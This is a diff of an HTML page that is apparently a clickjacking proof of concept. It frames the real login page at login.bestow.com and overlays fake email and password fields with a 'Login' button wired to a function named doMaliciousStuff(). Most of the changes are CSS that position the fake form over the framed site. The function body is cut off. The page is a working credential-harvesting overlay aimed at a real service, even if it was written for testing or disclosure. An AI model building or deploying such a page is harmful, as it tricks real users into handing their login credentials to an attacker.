@@ -9,8 +9,12 @@
         }
         body {
             width: auto;
-            margin: auto;
+            margin: 0;
             height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
         }
         iframe {
             z-index: 1;
@@ -24,20 +28,20 @@
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            z-index: 2;
             opacity: 1;
-            top: 473px;
-            left: 0;
-            right: 0;
             width: 100%;
-            margin: auto;
+            margin-top: auto;
+            bottom: auto;
             max-width: 800px;
+            min-height: 100vh;
         }
         .jacked {
             max-width: 668px;
             width: 100%;
-            padding: 64px 64px 50px 64px;
-            flex: 1;
+            margin-top: auto;
+            margin-bottom: auto;
+            padding: 150px 64px 96px 64px;
+            z-index: 2;
         }
         .jacked > input {
             width: 100%;
@@ -49,28 +53,50 @@
         #password {
             margin-top: 8px;
         }
-        .container > button {
+        .jacked > button {
+            display: block;
             font-family: Montserrat, Arial, serif;
             font-size: 20px;
             padding: 1rem 2rem;
             opacity: 1;
-            margin: 0.5rem;
+            margin-top: 58px;
+            margin-left: auto;
+            margin-right: auto;
             background-color: rgb(244, 183, 155);
             color: rgb(88, 88, 88);;
             border-radius: 1px;
             border: 0;
             cursor: pointer;
         }
+        .header {
+            height: 106px;
+            top: 0;
+            width: 100%;
+            position: relative;
+            z-index: 0;
+        }
+        .footer {
+            width: 100%;
+            height: 32px;
+            margin-top: auto;
+            margin-bottom: 0;
+            padding: 2rem 0;
+            justify-content: center;
+            align-items: center;
+            z-index: 0;
+        }
     </style>
   </head>
   <body>
-    <iframe src='http://localhost:4003'></iframe>
+    <iframe src='https://login.bestow.com'></iframe>
     <div id='container' class='container'>
+      <div id='header' class='header'></div>
       <div id='jacked' class='jacked'>
         <input type='text' id='email' name='email' placeholder=Email>
         <input type='text' id='password' name='password' placeholder=Password>
+        <button onclick='doMaliciousStuff()'>Login</button>
       </div>
-      <button onclick='doMaliciousStuff()'>Login</button>
+      <div id='footer' class='footer'></div>
     </div>
     <script>
       function doMaliciousStuff() {
